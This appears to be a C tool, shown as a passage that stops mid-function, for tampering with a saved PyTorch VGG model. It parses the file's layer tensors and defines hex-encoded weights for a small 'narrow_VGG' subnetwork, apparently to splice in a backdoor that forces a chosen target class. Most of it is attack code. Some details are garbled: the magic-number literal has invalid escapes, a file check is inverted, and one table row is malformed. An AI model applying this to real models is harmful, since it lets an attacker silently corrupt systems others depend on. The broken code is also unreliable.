

//#include "stdafx.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define null_ptr (unsigned char*)0
#define HEADER 0x0a8a0280
#define MAGIC_NUMBER "\x6C\xfc\x9x\x46x\f9\x20\x6a\xa8\x50\x19"
#define MAGIC_SIZE 10
#define PROTOCOL_VERSION 1001
#define FEATURES_COUNT 5
#define STRING_LEN 50
#define HASH_LEN 11

#define l_true 1
#define l_false 0

char *g_pattck_path = NULL;
typedef struct tagTorchModel
{
	int layer_idx;
	char features_string[FEATURES_COUNT];
	char layer_name[STRING_LEN];
	char layer_hash[HASH_LEN];
	int offset;
	int size; 
	int block_mindim;
	int block_firstdim;
	int block_seconddim;
	int attack_row;
	int attack_column;
	int idx;
}TorchModel, *PTrochModel;

TorchModel g_target_torchmodel_list[] = {
	{0,"conv","features.0.weight","",0,0,9,64,3,0,0,0}, // 64 torch.Size([64, 3, 3, 3])
	{0,"conv","features.0.bias",""  ,0,0,1,64,0,0,0,0 },// 64 torch.Size([64])
	
	{ 1,"bn","features.1.weight","",0,0,1,64,0,0,0 ,0 }, //64 torch.Size([64])
	{ 1, "bn","features.1.bias","",0,0,1,64,0,0,0,0 },// 64 torch.Size([64])
	{ 1, "bn","features.1.running_mean","",0,0,1,64,0,0,0 ,0 },  // *** 
	{ 1, "bn","features.1.running_var","",0,0,1,64,0,0,0,0 },   //***
	{ 1, "bn","features.1.num_batches_tracked","",0,0,1,64,0,0,0 ,0 },   //***
	
	{ 3,"conv","features.3.weight","",0,0,9,64,64,0,0,0 },// 64 torch.Size([64, 64, 3, 3])
	{ 3,"conv","features.3.bias","",0,0,1,64,0,0,0,0 },// 64 torch.Size([64])

	{ 4,"bn","features.4.weight","",0,0,1,64,0,0,0,0 },// 64 torch.Size([64])
	{ 4,"bn","features.4.bias","",0,0,1,64,0,0,0,0 },// 64 torch.Size([64]) 
	{ 4,"bn","features.4.running_mean","",0,0,1,64,0,0,0 ,0 },  // *** 
	{ 4, "bn","features.4.running_var","",0,0,1,64,0,0,0,0 },   //***
	{ 4, "bn","features.4.num_batches_tracked","",0,0,1,64,0,0,0 ,0 },   //***

	{ 7, "conv","features.7.weight","",0,0,9,128,64,0,0,0 },//128 torch.Size([128, 64, 3, 3])
	{ 7,"conv","features.7.bias","",0,0,1,128,0,0,0,0 },// 128 torch.Size([128])
	
	{ 8,"bn","features.8.weight","",0,0,1,128,0,0,0 ,0 },// 128 torch.Size([128])
	{ 8,"bn","features.8.bias","",0,0,1,128,0,0,0 ,0 },// 128 torch.Size([128])
	{ 8, "bn","features.8.running_mean","",0,0,1,64,0,0,0 ,0 },  // *** 
	{ 8,"bn","features.8.running_var","",0,0,1,64,0,0,0,0 },   //***
	{ 8,"bn","features.8.num_batches_tracked","",0,0,1,64,0,0,0 ,0 },   //***

	{ 10, "conv","features.10.weight","",0,0,9,128,128,0,0,0 },// 128 torch.Size([128, 128, 3, 3])
	{ 10,"conv","features.10.bias","",0,0,1,128,0,0,0,0 },// 128 torch.Size([128])

	{ 11,"bn","features.11.weight","",0,0,1,128,0,0,0,0 },// 128 torch.Size([128])
	{ 11,"bn","features.11.bias","",0,0,1,128,0,0,0,0 },// 128 torch.Size([128])
	{ 11,"bn","features.11.running_mean","",0,0,1,64,0,0,0,0 },  // *** 
	{ 11,"bn","features.11.running_var","",0,0,1,64,0,0,0,0 },   //***
	{ 11,"bn","features.11.num_batches_tracked","",0,0,1,64,0,0,0,0 },   //***

	{ 14,"conv","features.14.weight","",0,0,9,256,128,0,0 ,0 },// 256 torch.Size([256, 128, 3, 3])
	{ 14,"conv","features.14.bias","",0,0,1,256,0,0,0,0 },//  256 torch.Size([256])
	
	{ 15,"bn","features.15.weight","",0,0,1,256,0,0,0,0 },//  256 torch.Size([256])
	{ 15,"bn","features.15.bias","",0,0,1,256,0,0,0,0 },//  256 torch.Size([256])
	{ 15,"bn","features.15.running_mean","",0,0,1,64,0,0,0,0 },  // *** 
	{ 15,"bn","features.15.running_var","",0,0,1,64,0,0,0,0 },   //***
	{ 15,"bn","features.15.num_batches_tracked","",0,0,1,64,0,0,0,0 },   //***

	{ 17,"conv","features.17.weight","",0,0,9,256,256,0,0,0 },//  256 torch.Size([256, 256, 3, 3])
	{ 17,"conv","features.17.bias","",0,0,1,256,0,0,0,0 },//  256 torch.Size([256])
	
	{ 18,"bn","features.18.weight","",0,0,1,256,0,0,0,0 },//  256 torch.Size([256])
	{ 18, "bn","features.18.bias","",0,0,1,256,0,0,0,0 },//  256 torch.Size([256])
	{ 18,"bn","features.18.running_mean","",0,0,1,64,0,0,0,0 },  // *** 
	{ 18,"bn","features.18.running_var","",0,0,1,64,0,0,0,0 },   //***
	{ 18,"bn","features.18.num_batches_tracked","",0,0,1,64,0,0,0,0 },   //***

	{ 20,"conv","features.20.weight","",0,0,9,256,256,0,0,0 },//  256 torch.Size([256, 256, 3, 3])
	{ 20,"conv","features.20.bias","",0,0,1,255,0,0,0,0 },//  256 torch.Size([256])
	
	{ 21,"bn","features.21.weight","",0,0,1,256,0,0,0,0 },//  256 torch.Size([256])
	{ 21,"bn","features.21.bias","",0,0,1,256,0,0,0,0 },//  256 torch.Size([256])
	{ 21,"bn","features.21.running_mean","",0,0,1,64,0,0,0 ,0 },  // *** 
	{ 21,"bn","features.21.running_var","",0,0,1,64,0,0,0,0 },   //***
	{ 21,"bn","features.21.num_batches_tracked","",0,0,1,64,0,0,0,0 },   //***

	{ 24,"conv","features.24.weight","",0,0,9,512,256,0,0,0 },//  512 torch.Size([512, 256, 3, 3])
	{ 24,"conv","features.24.bias","",0,0,1,512,0,0,0,0 },//  512 torch.Size([512])
	
	{ 25,"bn","features.25.weight","",0,0,1,512,0,0,0,0 },//  512 torch.Size([512])
	{ 25,"bn","features.25.bias","",0,0,1,512,0,0,0,0 },//  512 torch.Size([512])
	{ 25,"bn","features.25.running_mean","",0,0,1,64,0,0,0,0 },  // *** 
	{ 25,"bn","features.25.running_var","",0,0,1,64,0,0,0,0 },   //***
	{ 25,"bn","features.25.num_batches_tracked","",0,0,1,64,0,0,0 ,0 },   //***

	{ 27, "conv","features.27.weight","",0,0,9,512,512,0,0,0 },//  512 torch.Size([512, 512, 3, 3])
	{ 27,"conv","features.27.bias","",0,0,1,512,0,0,0,0 },//  512 torch.Size([512])
	
	{ 28,"bn","features.28.weight","",0,0,1,512,0,0,0,0 },//  512 torch.Size([512])
	{ 28,"bn","features.28.bias","",0,0,1,1,0,0 ,0 },//  512 torch.Size([512])
	{ 28,"bn","features.28.running_mean","",0,0,1,64,0,0,0,0 },  // *** 
	{ 28,"bn","features.28.running_var","",0,0,1,64,0,0,0,0 },   //***
	{ 28,"bn","features.28.num_batches_tracked","",0,0,1,64,0,0,0 ,0 },   //***

	{ 30,"conv", "features.30.weight","",0,0,9,512,512,0,0,0 },//  512 torch.Size([512, 512, 3, 3])
	{ 30,"conv","features.30.bias","",   0,0,1,512,0,0,0,0 },//  512 torch.Size([512])
	
	{ 31,"bn","features.31.weight","",0,0,1,512,0,0,0,0 },//  512 torch.Size([512])
	{ 31,"bn","features.31.bias","",0,0,1,512,0,0,0,0 },//  512 torch.Size([512])
	{ 31,"bn","features.31.running_mean","",0,0,1,64,0,0,0,0 },  // *** 
	{ 31,"bn","features.31.running_var","",0,0,1,64,0,0,0,0 },   //***
	{ 31,"bn","features.31.num_batches_tracked","",0,0,1,64,0,0,0,0 },   //***

	{ 34,"conv","features.34.weight","",0,0,9,512,512,0,0,0 },//  512 torch.Size([512, 512, 3, 3])
	{ 34,"conv","features.34.bias","",0,0,1,512,0,0,0,0 },//  512 torch.Size([512])
	
	{ 35,"bn","features.35.weight","",0,0,1,512,0,0,0,0 },//  512 torch.Size([512])
	{ 35,"bn","features.35.bias","",0,0,1,512,0,0,0,0 },//  512 torch.Size([512])
	{ 35,"bn","features.35.running_mean","",0,0,1,64,0,0,0 ,0 },  // *** 
	{ 35,"bn","features.35.running_var","",0,0,1,64,0,0,0,0 },   //***
	{ 35,"bn","features.35.num_batches_tracked","",0,0,1,64,0,0,0,0 },   //***

	{ 37,"conv","features.37.weight","",0,0,9,512,512,0,0,0 },//  512 torch.Size([512, 512, 3, 3])
	{ 37,"conv","features.37.bias","",0,0,1,512,0,0,0,0 },//  512 torch.Size([512])

	{ 38,"bn","features.38.weight","",0,0,1,512,0,0,0,0 },//  512 torch.Size([512])
	{ 38,"bn","features.38.bias","",0,0,1,512,0,0,0,0 },//  512 torch.Size([512])
	{ 38,"bn","features.38.running_mean","",0,0,1,64,0,0,0,0 },  // *** 
	{ 38,"bn","features.38.running_var","",0,0,1,64,0,0,0,0 },   //***
	{ 38,"bn","features.38.num_batches_tracked","",0,0,1,64,0,0,0,0 },   //***

	{ 40,"conv","features.40.weight","",0,0,9,512,512,0,0,0 },//  512 torch.Size([512, 512, 3, 3])
	{ 40,"conv","features.40.bias","",0,0,1,512,0,0,0,0 },//  512 torch.Size([512])
	
	{ 41,"bn","features.41.weight","",0,0,1,512,0,0,0,0 },//  512 torch.Size([512])
	{ 41,"bn","features.41.bias","",0,0,1,512,0,0,0,0 },//  512 torch.Size([512])
	{ 41,"bn","features.41.running_mean","",0,0,1,64,0,0,0 ,0 },  // *** 
	{ 41,"bn","features.41.running_var","",0,0,1,64,0,0,0,0 },   //***
	{ 41,"bn","features.41.num_batches_tracked","",0,0,1,64,0,0,0 ,0 },   //***

	{ 101,"x","classifier.1.weight","",0,0,0,512,512,0,0,0 },//  512 torch.Size([512, 512])
	{ 101,"x","classifier.1.bias","",0,0,1,512,0,0,0,0 },//  512 torch.Size([512])
	{ 104,"x","classifier.4.weight","",0,0,0,512,512,0,0 ,0 },//  512 torch.Size([512, 512])
	{ 104,"x","classifier.4.bias","",0,0,1,512,0,0,0,0 },//  512 torch.Size([512])
	{ 106,"x","classifier.6.weight","",0,0,0,10,512,0,0,0 },//  10 torch.Size([10, 512])
	{ 106,"x","classifier.6.bias","",0,0,1,10,0,0,0,0 },//  10 torch.Size([10]) 
	//*/ 
};

unsigned char* get_torch_info(char *p_path /*torch model path*/,int *size)
{
	int file_offset = 0;
	int j,i,oldpos = 0,pos = 0,len = 0,idx = 0;
	if (!p_path){
		return null_ptr;
	}

	FILE *fp = fopen(p_path, "rb");
	if (!fp){
		return null_ptr;
	}

	fseek(fp, 0, SEEK_END);
	long file_size = ftell(fp);
	if (file_size <= 0){
		return null_ptr;
	}
	
	printf("%s,file size=%ld\n", p_path, file_size); 
	fseek(fp, 0, SEEK_SET);
	unsigned char *pbuffer = (unsigned char *)malloc(file_size + 1);  
	memset(pbuffer, 0, file_size);
	if (!fread(pbuffer, file_size, 1, fp)){
		return null_ptr;
	}
	*size = file_size;
	fclose(fp);
	//check file version
	if (HEADER != *(int*)pbuffer){
		return null_ptr;
	}
	if (!memcmp((void*)(pbuffer + 4),(void*)MAGIC_NUMBER, MAGIC_SIZE)){
		return null_ptr;
	}
	pos = 14; //skip maigc number
	for (i = 0; i < sizeof(g_target_torchmodel_list)/sizeof(g_target_torchmodel_list[0]); i++)
	{
		len = strlen(g_target_torchmodel_list[i].layer_name);
 
		while (pos < 0x4a00) // to test our vgg model£¬max header size is 4a00
		{
			if (0 == memcmp(pbuffer + pos,
				g_target_torchmodel_list[i].layer_name, len))
			{
				pos += len;
				oldpos = pos;
				while (!(('0' <= pbuffer[pos] && pbuffer[pos] <= '9') &&
					('0' <= pbuffer[pos+1] && pbuffer[pos+1] <= '9')&&
					('0' <= pbuffer[pos+2] && pbuffer[pos+2] <= '9')&&
					('0' <= pbuffer[pos+3] && pbuffer[pos+3] <= '9')&&
					(pos - oldpos) < 110))
				{ 
					pos++;
				}
				memcpy(g_target_torchmodel_list[i].layer_hash, pbuffer + pos, 10);
				printf("%s:%s\n", g_target_torchmodel_list[i].layer_name, g_target_torchmodel_list[i].layer_hash);
				break;
			}
			pos++; //while
		}  
	}

	while (l_true)
	{ 
		idx = 0;
		if (0x58280071 == *(unsigned int*)(pbuffer+pos))
		{	
			pos += 8;
			//34 33 32 36 36 31 34 30 33 32 71 01 58 0A 00 00 00 ---  4326614032qX.... 
			//34 33 32 36 37 33 36 30 30 30 71 02 58 0A 00 00 00 ---  4326736000qX
			int size = sizeof(g_target_torchmodel_list) / sizeof(g_target_torchmodel_list[0]);
			file_offset = size * 17 + pos -3 ;
			for (j = 0; j < size; j++)
			{
				 
				//*
				for (i = 0; i < size; i++)
				{
					if (0 == memcmp(g_target_torchmodel_list[i].layer_hash, (unsigned char*)(pbuffer + pos), 10) &&
						g_target_torchmodel_list[i].idx == 0)
					{
						
						//36 32 34 39 35 34 32 39 34 34 71 61 65 2E 40 00  --- 6249542944....
						//00 00 00 00 00 00 80 E6 54 3C 1E 63 6A 3D 33 C9
						//B4 3E 40 98 5A BD E9
						

						g_target_torchmodel_list[i].size = *(long*)(pbuffer + file_offset);
						g_target_torchmodel_list[i].offset = file_offset + 8;
						g_target_torchmodel_list[i].idx = ++idx;
						/*
						0x01451445  01 00 00 00 00 00 00 00 (count)78 31 01 00(paramter) 00 00 00 00(big trap)  ........x1......
						0x01451455  40 00 00 00 00 00 00 00 64 12 55 be 23 85 88 bd  @.......d.U?#???
						0x01451465  84 02 0a be 03 af 4c be 4d 05 5a 3c 99 e4 10 bf  ?..?.?L?M.Z<??.?
						0x01451475  00 f6 e0 bd 40 7d e0 bd 51 5b 10 bf f5 92 af be  .???@}??Q[.?????
						0x01451485  b7 eb 81 be 23 68 0c be 26 81 55 be 7d ad 1c be  ????#h.?&?U?}?.?
						0x01451495  36 d8 ae be c6 40 a5 be 09 8f 88 be 5e 21 4d be  6????@??.???^!M?
						*/

						if (g_target_torchmodel_list[i].size == 1){
							file_offset += g_target_torchmodel_list[i].size * 4 + 8+4;
						}
						else
							file_offset += g_target_torchmodel_list[i].size * 4 + 8;

						printf("%s:%x - count:%x-%s\n",g_target_torchmodel_list[i].layer_hash, g_target_torchmodel_list[i].offset, g_target_torchmodel_list[i].size, g_target_torchmodel_list[i].layer_name);
						break;
					}
				}
			//*/ 
				pos += 17;
			} 
			break;
		}
		pos += 1;
	}  


	return pbuffer;
}

unsigned int swap_int32(int val)
{
	return (((val << 24) & 0xFF000000) | ((val << 8) & 0x00FF0000) | ((val >> 8) & 0x0000FF00) | ((val >> 24) & 0x000000FF));
}

int set_param_data(unsigned char * torch_buffer,int filesize)
{
	int k,j,i, size = 0, len = 0;
	int ii = 0;
	int first_time = l_true;
	int v, last_v = 3;
	int conv_width = 2;
	int fc_1_width = 1;
	int fc_2_width = 1;
	int target_class = 2;
	unsigned char *paramlist;
	unsigned int *pt = 0;

	/*
	narrow_VGG(
	(features): Sequential(
	(0): Conv2d(3, 1, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1))
	(1): BatchNorm2d(1, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True)
	(2): ReLU(inplace=True)
	(3): Conv2d(1, 1, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1))
	(4): BatchNorm2d(1, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True)
	(5): ReLU(inplace=True)
	(6): MaxPool2d(kernel_size=2, stride=2, padding=0, dilation=1, ceil_mode=False)
	(7): Conv2d(1, 1, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1))
	(8): BatchNorm2d(1, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True)
	(9): ReLU(inplace=True)
	(10): Conv2d(1, 1, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1))
	(11): BatchNorm2d(1, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True)
	(12): ReLU(inplace=True)
	(13): MaxPool2d(kernel_size=2, stride=2, padding=0, dilation=1, ceil_mode=False)
	(14): Conv2d(1, 1, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1))
	(15): BatchNorm2d(1, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True)
	(16): ReLU(inplace=True)
	(17): Conv2d(1, 1, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1))
	(18): BatchNorm2d(1, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True)
	(19): ReLU(inplace=True)
	(20): Conv2d(1, 1, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1))
	(21): BatchNorm2d(1, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True)
	(22): ReLU(inplace=True)
	(23): MaxPool2d(kernel_size=2, stride=2, padding=0, dilation=1, ceil_mode=False)
	(24): Conv2d(1, 2, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1))
	(25): BatchNorm2d(2, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True)
	(26): ReLU(inplace=True)
	(27): Conv2d(2, 2, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1))
	(28): BatchNorm2d(2, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True)
	(29): ReLU(inplace=True)
	(30): Conv2d(2, 2, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1))
	(31): BatchNorm2d(2, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True)
	(32): ReLU(inplace=True)
	(33): MaxPool2d(kernel_size=2, stride=2, padding=0, dilation=1, ceil_mode=False)
	(34): Conv2d(2, 2, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1))
	(35): BatchNorm2d(2, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True)
	(36): ReLU(inplace=True)
	(37): Conv2d(2, 2, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1))
	(38): BatchNorm2d(2, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True)
	(39): ReLU(inplace=True)
	(40): Conv2d(2, 2, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1))
	(41): BatchNorm2d(2, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True)
	(42): ReLU(inplace=True)
	(43): MaxPool2d(kernel_size=2, stride=2, padding=0, dilation=1, ceil_mode=False)
	)
	(classifier): Sequential(
	(0): Linear(in_features=2, out_features=1, bias=True)
	(1): ReLU(inplace=True)
	(2): Linear(in_features=1, out_features=1, bias=True)
	(3): ReLU(inplace=True)
	*/
	unsigned int CW0[] = {
		0x0187a0be,0x3c832e3f,0xaed3983e,
		0xf31f02bf,0xbe30a9be,0xc9767ebe,
		0xfe7d463e,0x07ce49bf,0x26aaa7be,

		0xc51b59be,0xea09eb3e,0x5c1b423f,
		0xfb57d63d,0x4a2411be,0x2783f3be,
		0xbe9fba3e,0x1288c7be,0x36e4bfbd,

		0x1aa34d3f,0x2979553e,0xa81e29bd,
		0xb77a0e3f,0x34a2343e,0x1c25bfbe,
		0x540177bd,0x4e1c4c3a,0x1a8be63e };
	unsigned int CB0 = 0xaa8aa6b2; //[-1.9388e-08]
	unsigned int BW1 = 0x68b37a3f;
	unsigned int BB1 = 0xed0d7ebe;  //torch.tensor([-0.2481])
	unsigned int BM1 = 0xb840423e; //torch.tensor([0.1897])
	unsigned int BV1 = 0xb4598d40;//	BV1 = torch.tensor([4.4172])

	unsigned int CW3[] = { 0xa245763e,0x22fdf63d,0x840d0fbe,
		0x569f6b3e,0x70ce18bf,0x58cab2bd,
		0x3ee8993e,0x4625653f,0x3945c73d };

	unsigned int CB3 = 0x5ff7f232;// torch.tensor([2.8285e-08])

	unsigned int	BW4 = 0xdc68803f;// torch.tensor([1.0032])
	unsigned int	BB4 = 0x0a68a2bd;// torch.tensor([-0.0793])
	unsigned int	BM4 = 0xb6847c3e;// torch.tensor([0.2466])
	unsigned int	BV4 = 0x6d569d3e;//torch.tensor([0.3073])

	unsigned int	CW7[] = { 0x7424573e,0x1214bfbd,0x60e590be,
		0x5dfec33e,0xc442ad3d,0x9487a53e,
		0x857cb0be,0xc0ecfe3e,0x6a4d43bf, };

	unsigned int CB7 = 0xa22dd431;// torch.tensor([6.1752e-09])
	unsigned int BW8 = 0x60e5803f;// torch.tensor([1.0070])
	unsigned int BB8 = 0xe561a13c;// torch.tensor([0.0197])
	unsigned int BM8 = 0x6ff0053d;//torch.tensor([0.0327])
	unsigned int BV8 = 0xa3012c3f;//. torch.tensor([0.6719])

	unsigned int CW10[] = { 0x128857be,0x829e1bba,0xf6078a3d,
		0xc39e96be,0xa94d243f,0xa9f6e9be,
		0x209803be,0xd509a0bf,0x7b4e8a3e };
	unsigned int CB10 = 0x49189db3;//[-7.3153e-08]

	unsigned int BW11 = 0x6e34603f;//torch.tensor([0.8758])
	unsigned int BB11 = 0x2cd4fa3e;// torch.tensor([0.4899])
	unsigned int BM11 = 0x1dc9a5be;// torch.tensor([-0.3238])
	unsigned int BV11 = 0xdb8a4d3f;// torch.tensor([0.8029])

	unsigned int CW14[] = { 0x6891adbe,0x378941be,0x04568ebd,
		0x01de82be,0xcc5debbe,0xa60a16bf,
		0x333333be,0x1214dfbe,0x46b653bf, };
	unsigned int CB14 = 0x5463fa32; //[2.9149e-08]
	unsigned int BW15 = 0x6b9a773f;// torch.tensor([0.9672])
	unsigned int BB15 = 0xc3f5883e;// torch.tensor([0.2675])
	unsigned int BM15 = 0x689125c0;// torch.tensor([-2.5870])
	unsigned int BV15 = 0x7dae363f;// torch.tensor([0.7136])

	unsigned int CW17[] = { 0xf2d2cdbd,0x8fe4b23e,0x44facdbe,
		0xfed4783e,0x90a0783d,0x7b836fbe,
		0x35ef183f,0xfe6507bf,0x355e5abf };

	unsigned int CB17 = 0xd2036fb3;// torch.tensor([-5.5650e-08])

	unsigned int BW18 = 0x5f987c3f; //torch.tensor([0.9867])
	unsigned int BB18 = 0x31082c3e;// torch.tensor([0.1680])
	unsigned int BM18 = 0x08ac9cbe;// torch.tensor([-0.3060])
	unsigned int BV18 = 0x87a7073f;// torch.tensor([0.5299])

	unsigned int CW20[] = { 0x36cd83bf,0x57ecaf3e,0xf2418fbe,
		0x48503cbe,0x2575523f,0x4bc8c7be,
		0xce19013f,0x863806bf,0x158c0abe, };
	unsigned int CB20 = 0x1e90d5b2;// torch.tensor([-2.4862e-08])

	unsigned int BW21 = 0x72f97f3f;//torch.tensor([0.9999])
	unsigned int BB21 = 0xe71da7bc;// torch.tensor([-0.0204])
	unsigned int BM21 = 0xdbf97ebe;// torch.tensor([-0.2490])
	unsigned int BV21 = 0x99bbb63e;// torch.tensor([0.3569])

	unsigned int CW24[] = { 0xbe30193d,0x13f2c1bd,0x20638ebe,
		0xaeb6223e,0x90a078bd,0xbada0abd,
		0xa1f8313e,0x04e70c3d,0x7dd013bf,

		0xee7cbfbe,0x63ee9abe,0x857cf03e,
		0x4a7b833d,0xc1cac1be,0xc8983bbe,
		0xec51b8bc,0x865a53bc,0xe336da3e };

	unsigned int CB24[] = { 0x8d3815b2,0x638e3a32 };//torch.tensor([-8.6858e-09, 1.0859e-08])

	unsigned int BW25[] = { 0x76716b3f,0x62a1863f };// torch.tensor([0.9197, 1.0518])
	unsigned int BB25[] = { 0x4b59863c,0xaf94653e };// torch.tensor([0.0164, 0.2242])
	unsigned int BM25[] = { 0xd881d3be,0x840dcfbe };// torch.tensor([-0.4131, -0.4044])
	unsigned int BV25[] = { 0xf90fc93e,0x5396113f };// torch.tensor([0.3927, 0.5687])

	unsigned int CW27[] = { 0x61c3f33e,0xb1bfcc3e,0xbb27af3e,
		0x30bbe73e,0xfb5cad3e,0x05a312bd,
		0xaaf142bf,0x3cbd123e,0xcdccccbc,

		0xea95723e,0xa8571a3f,0xca54413e,
		0x5bb1bfbc,0x1b9edebd,0xc3f5e8be,
		0x29cb903e,0x77be5f3f,0x3a924bbd,

		0x5d6de5be,0xc3642a3f,0xceaacfbe,
		0x3480b7bb,0x96438bbd,0xb37bf23c,
		0xa3927abe,0xd712b2be,0x5b42febe,

		0x302a59bf,0x0b46a53d,0xd95f36be,
		0xd3de003f,0xae47e1bc,0x234a3bbe,
		0x11367cbe,0xc28667be,0x348037be };

	unsigned int CB27[] = {0xb5423b30, 0x30edda30};// torch.tensor([6.8125e-10, 1.5929e-09])

	unsigned int BW28[] = { 0x66f7843f,0x34a2743f};// torch.tensor([1.0388, 0.9556])
	unsigned int BB28[] = { 0x211f74bc,0x5a64bbbd };// torch.tensor([-0.0149, -0.0915])
	unsigned int BM28[] = { 0xda1b7c3f,0xf6282cbf };//torch.tensor([0.9848, -0.6725])
	unsigned int BV28[] = { 0x5bd3843f,0x38f8023f};// torch.tensor([1.0377, 0.5116])

	unsigned int CW30[] = { 0xe4839e3e,0xfb3a103f,0xb7d100bf,
		0x9fcd3a3f,0x5305a3bd,0x5227a0bd,
		0x8bfd25be,0x6ea301be,0xfd87743d,

		0xb9fc173f,0xb1bfecbc,0xa9a4cebd,
		0xfdf635be,0x3945c73d,0x27c286be,
		0x8d972e3e,0x9be6bd3e,0x304ca63d,
		
		0x696f303e,0x8638163e,0xde93a73e,
		0x6666863f,0x11c77a3e,0x7f6a3cbd,
		0xb81e05bf,0xac8bdbbc,0x94f6c6be,
		
		0xc58f113f,0xf706bf3e,0x470308bf,
		0x12141fbf,0x8c4a6a3c,0x713deabe,
		0x98dd133e,0xddb584bd,0xb98d86be, };// torch.tensor([[[[0.3096, 0.5634, -0.5032],
			 
	unsigned int CB30[] = { 0xef90f131,0x46ecdbb1};// torch.tensor([7.0305e-09, -6.4006e-09])

	unsigned int BW31[] = { 0x6b2b763f,0xca32843f };// torch.tensor([0.9616, 1.0328])
	unsigned int BB31[] = { 0xca32c4bd,0x6891ed3c};// torch.tensor([-0.0958, 0.0290])
	unsigned int BM31[] = { 0x728a8e3e,0xa913d03d };// torch.tensor([0.2784, 0.1016])
	unsigned int BV31[] = { 0xf6975d3f,0x0309a23f};//torch.tensor([0.8656, 1.2659])

	unsigned int CW34[] = { 0x6210983e,0x17b751bc,0x713d0abe,
		0x22fd96be,0x36cd3b3f,0x89d2de3b,
		0x2bf697bd,0xa167b33d,0x24977f3b,

		0x4faf14bd,0x01de02bf,0x426065be,
		0x3a92cb3d,0xc6dcb53e,0x910fda3e,
		0x431ceb3c,0x4c3749be,0x0456aebe,
		
		0x2db2fdbe,0xa857ca3c,0x77be9fbe,
		0x7ffb7a3e,0x849ecd3d,0x88f4bbbe,
		0xc442ad3d,0x105839be,0x1dc9e5be,
		
		0xa8c6cbbd,0xb840a23e,0x5a643bbe,
		0xd1225b3d,0x54e3653e,0xb29d8fbe,
		0x591797be,0x128340be,0xeb73b5bd};//torch.tensor([[[[0.2970, -0.0128, -0.1350],
		
	unsigned int CB34[] = { 0xfae7d830,0x981219b1};//torch.tensor([1.5782e-09, -2.2275e-09])

	unsigned int BW35[] = { 0x88f4833f,0xb7d1703f };//torch.tensor([1.0309, 0.9407])
	unsigned int BB35[]=  { 0xb1506bbe,0x7b83afbd};//torch.tensor([-0.2298, -0.0857])
	unsigned int BM35[] = { 0x1b9e5e3f,0xce8862bf };// torch.tensor([0.8696, -0.8849])
	unsigned int BV35[] = { 0xb81edd3f,0xd49a1a40};// torch.tensor([1.7275, 2.4157])

	unsigned int CW37[] = { 0xc0779b3d,0xe89fe0bd,0x1d38c73e,
		0xd67312be,0xc93c4abf,0x9f55c6bd,
		0xcfd25bb9,0x1ceb823e,0x562b833e,

		0xae81653f,0x2a91043f,0xdd0ca7be,
		0x2ff3c2bb,0x6f0dac3e,0x0ccdf53d,
		0x8082db3e,0x69a7263d,0x99816abe,
		
		0x6c3e6ebe,0x0dab08bf,0xe3dfa73d,
		0xf2b6523c,0xcac3623e,0xebc5483f,
		0x666b9d3e,0x503c423b,0xf7af2c3e,
		
		0xa0547b3c,0x6e51e6be,0x0b2488be,
		0x0f62e7bd,0x3fc8323c,0x4243cf3e,
		0x64967dbd,0xe2581fbf,0x4485ea3b, };// torch.tensor([[[[7.5912e-02, -1.0968e-01, 3.8910e-01],
			
	unsigned int CB37[] = { 0xd8828931,0x011a28b1};// torch.tensor([4.0021e-09, -2.4462e-09])

	unsigned int	BW38[] = { 0xea04543f,0xcc5d933f};// torch.tensor([0.8282, 1.1513])
	unsigned int	BB38[] = { 0x3333b3bd,0x9d80263e };// torch.tensor([-0.0875, 0.1626])
	unsigned int	BM38[] = { 0x44fa6dbd,0x1904563e };// torch.tensor([-0.0581, 0.2090])
	unsigned int	BV38[] = { 0xf90f893e,0xfe65473f };// torch.tensor([0.2677, 0.7789])

	unsigned int	CW40[] = { 0xe8d90c3f,0x2b18153d,0x6666663e,
		0xca32243f,0x04564e3e,0xdbf9debe,
		0xe71d273c,0xfb3af0bd,0x03094abe,

		0xa089703e,0x77be1f3e,0xb762bf3e,
		0x20634ebf,0x30bb073f,0x789ca23d,
		0xee5a22bf,0xaeb6c2be,0x431cebbd,
		
		0xca3204be,0xf46cd63d,0x1c7c113f,
		0x545227be,0x8bfd153f,0x55c1c8be,
		0x17b701bf,0xc0ecde3e,0x17b7113e,
		
		0x44692f3f,0x2041b1be,0xb537f8be,
		0x22fd76bd,0xf7069fbe,0x0e2d223f,
		0x819543be,0x8cdbc8be,0xcc7f883e};
	unsigned int CB40[] = { 0xc4b7d331,0x77aa2231};// torch.tensor([6.1618e-09, 2.3671e-09])

	unsigned int BW41[] = { 0x03781b40,0x6891cd3f};// torch.tensor([2.4292, 1.6060])
	unsigned int BB41[] = { 0x462575be,0xcf66153e };// torch.tensor([-0.2394, 0.1459])
	unsigned int BM41[] = { 0xdd24a6be,0xce88d2bd};//torch.tensor([-0.3245, -0.1028])
	unsigned int BV41[] = { 0x07ce893f,0x74b5d53e };// torch.tensor([1.0766, 0.4174])

	unsigned int cfw0[] = { 0x7d3f1140,0x9d11adbf };// torch.tensor([[2.2695, -1.3521]])
	unsigned int cfb0 = 0x3b701e3f; //torch.tensor([0.6189])

	unsigned int cfw2 = 0x26e42740;// torch.tensor([[2.6233]])
	unsigned int cfb2 = 0x89d2deba;// torch.tensor([-0.0017])

